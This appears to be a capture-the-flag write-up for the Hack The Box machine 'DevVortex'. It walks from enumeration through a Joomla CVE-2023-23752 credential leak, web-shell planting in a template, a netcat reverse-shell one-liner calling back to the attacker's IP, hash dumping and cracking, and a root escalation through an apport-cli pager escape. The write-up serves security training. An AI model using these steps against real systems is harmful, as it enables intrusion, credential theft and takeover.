DevVortex

# Enumeration

Check nmap-scan. 
Open Ports are 80 and 22 . Moreover port 80 redirects to http://devvortex.htb/

So let's add this one to hosts-file

```
echo '10.10.11.242 devvortex.htb' | sudo tee -a /etc/hosts
```

## Vhost discovery

```
gobuster vhost -u http://devvortex.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 40 -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://devvortex.htb
[+] Method:          GET
[+] Threads:         40
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/11/26 12:04:27 Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 4989 / 4990 (99.98%)
Found: dev.devvortex.htb Status: 200 [Size: 23221]
===============================================================
2023/11/26 12:04:35 Finished
===============================================================
```

```
echo '10.10.11.242 dev.devvortex.htb' | sudo tee -a /etc/hosts
```

## Dir Discovery

```
gobuster dir -u http://dev.devvortex.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.devvortex.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/11/26 14:55:59 Starting gobuster in directory enumeration mode

....
many 403
....
/administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]
/api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]
/api/experiments      (Status: 406) [Size: 29]
/api/experiments/configurations (Status: 406) [Size: 29]
/cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]
/components           (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/components/]
/home                 (Status: 200) [Size: 23221]
/images               (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/images/]
/includes             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/includes/]
/index.php            (Status: 200) [Size: 23221]
/language             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/language/]
/layouts              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/layouts/]
/libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/]
/media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/]
/modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]
/plugins              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/plugins/]
/robots.txt           (Status: 200) [Size: 764]
/templates            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/templates/]
/tmp                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/tmp/]

```

## Joomla Version detection

At http://dev.devvortex.htb/README.txt the Joomla Version 4.2 get revealed.

## Grab Login Creds

Joomla! information disclosure - CVE-2023-23752 exploit

```
git clone https://github.com/Acceis/exploit-CVE-2023-23752

cd exploit-CVE-2023-23752

 ruby exploit.rb http://dev.devvortex.htb                                                                            │
Users                                                                                                                 │
[649] lewis (lewis) - lewis@devvortex.htb - Super Users                                                               │
[650] logan paul (logan) - logan@devvortex.htb - Registered                                                           │
                                                                                                                      │
Site info                                                                                                             │
Site name: Development                                                                                                │
Editor: tinymce                                                                                                       │
Captcha: 0                                                                                                            │
Access: 1                                                                                                             │
Debug status: false                                                                                                   │
                                                                                                                      │
Database info                                                                                                         │
DB type: mysqli                                                                                                       │
DB host: localhost                                                                                                    │
DB user: lewis                                                                                                        │
DB password: P4ntherg0t1n5r3c0n##                                                                                     │
DB name: joomla                                                                                                       │
DB prefix: sd4fg_                                                                                                     │
DB encryption 0
```

## Edit Joomla templates

Edit the Error-Template under the following url:
```
http://dev.devvortex.htb/administrator/index.php?option=com_templates&view=template&id=223&file=L2Vycm9yLnBocA%3D%3D&isMedia=0
```

Or got to 'System' --> 'Site Templates' --> 'Cassiopeia Details and Files' --> 'error.php'

Replace the Content with the ponyshell or 

```
https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
``` 

Using webshell at following url:
```
http://dev.devvortex.htb/templates/cassiopeia/error.php
```

## Upgrading shell

Generating oneliner using msfvnenom
```
msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.10 LPORT=1337
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 93 bytes

mkfifo /tmp/gsrtf; nc 10.10.14.10 1337 0</tmp/gsrtf | /bin/sh >/tmp/gsrtf 2>&1; rm /tmp/gsrtf
```

## Start nc listen on port 1337
```
nc -nvlp 1337
```

## Run command on p0wnyshell
```
mkfifo /tmp/gsrtf; nc 10.10.14.10 1337 0</tmp/gsrtf | /bin/sh >/tmp/gsrtf 2>&1; rm /tmp/gsrtf
```

## Discovery internal open ports
Checking connections (3306 and 33060 are for mysql)
```
netstat -nltp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      869/nginx: worker p
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      869/nginx: worker p
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

## Show Databases

```
mysql -u lewis -p -P 33060 -e "SHOW DATABASES;"
Enter password: P4ntherg0t1n5r3c0n##
Database
information_schema
joomla
performance_schema
```


## Show Tables

Actually these information(Database/Tables) are already know by extrating the passes but for learning let's do it step by step.

```
mysql -u lewis -p -P 33060 -e "SHOW TABLES;" joomla
Enter password: 

Many Tables but the one below is the one which is interesting for us
....
sd4fg_users 
....


```

## Get Hashes from DB

```
mysql -u lewis -p -P 33060 -e "SELECT * FROM sd4fg_users ;" joomla
Enter password: P4ntherg0t1n5r3c0n##

id      name    username        email   password        block   sendEmail       registerDate    lastvisitDate   activation      params  lastResetTime   resetCount      otpKey  otep    requireReset    authProvider
649     lewis   lewis   lewis@devvortex.htb     $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u    0       1       2023-09-25 16:44:24     2023-11-27 12:47:51     0               NULL    0                       0
650     logan paul      logan   logan@devvortex.htb     $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12    0       0       2023-09-26 19:15:42     NULL            {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"}     NULL    0                       0

```

## Crack Hashes

We can crack logans hash and login via ssh

```
echo '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' > hash

hashcat --identify hash
The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt.gz
```

# Priviliges escalation

```
 ssh logan@devvortex.htb
logan@devvortex.htb's password:
...

-bash-5.0$ sudo -l
[sudo] password for logan:
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
-bash-5.0$
```

Run the command and get a pager where we can enter a command to get a shell
```
sudo apport-cli -c /bin/mysql less

 sudo apport-cli -c /bin/mysql less

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.6 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v

....
TLB size        : 3072 4K pages
clflush size    : 64

!sh
# whoami
root

```

